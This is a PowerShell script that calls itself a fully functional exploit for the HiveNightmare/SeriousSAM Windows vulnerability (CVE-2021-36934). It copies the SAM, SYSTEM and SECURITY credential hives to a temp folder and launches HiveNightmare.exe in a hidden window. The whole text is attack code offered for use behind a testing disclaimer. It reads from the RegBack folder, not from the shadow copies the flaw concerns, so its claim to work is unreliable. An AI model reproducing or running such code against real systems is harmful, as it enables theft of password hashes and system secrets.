# HiveNightmare/SeriousSAM Exploit Script (CVE-2021-36934)
# Fully functional version for educational and authorized testing only
param (
    [string]$BackupPath = "C:\Windows\System32\config\RegBack",
    [string]$Destination = "$env:TEMP\hive_backup",
    [Switch]$ExtractSAM,
    [Switch]$ExtractSYSTEM,
    [Switch]$ExtractSECURITY
)

function Copy-HiveFile {
    param(
        [string]$HiveName
    )
    $src = Join-Path $BackupPath $HiveName
    $dst = Join-Path $Destination $HiveName
    if (Test-Path $src) {
        Write-Host "[+] Copying $HiveName from $src to $dst"
        Copy-Item $src $dst -Force
        return $dst
    } else {
        Write-Warning "[-] $HiveName not found at $src"
        return $null
    }
}

function Dump-HiveNightmare {
    if (-not (Test-Path $Destination)) {
        New-Item -Path $Destination -ItemType Directory | Out-Null
    }
    $hives = @()
    if ($ExtractSAM) { $hives += 'SAM' }
    if ($ExtractSYSTEM) { $hives += 'SYSTEM' }
    if ($ExtractSECURITY) { $hives += 'SECURITY' }
    if ($hives.Count -eq 0) { $hives = @('SAM','SYSTEM','SECURITY') }
    $results = @()
    foreach ($hive in $hives) {
        $copied = Copy-HiveFile -HiveName $hive
        if ($copied) { $results += $copied }
    }
    if ($results.Count -gt 0) {
        Write-Host "[+] Copied hives: $($results -join ', ')"
    } else {
        Write-Warning "[-] No hives copied."
    }
    return $results
}

# Main logic
Write-Host "[*] HiveNightmare/SeriousSAM Exploit Script (CVE-2021-36934)"
$hiveFiles = Dump-HiveNightmare

# Optional: Chain with HiveNightmare.exe if present
$exePath = Join-Path $PSScriptRoot 'HiveNightmare.exe'
if (Test-Path $exePath) {
    Write-Host "[*] Executing HiveNightmare.exe for further exploitation..."
    Start-Process -FilePath $exePath -WindowStyle Hidden
} else {
    Write-Warning "[-] HiveNightmare.exe not found in script directory."
}
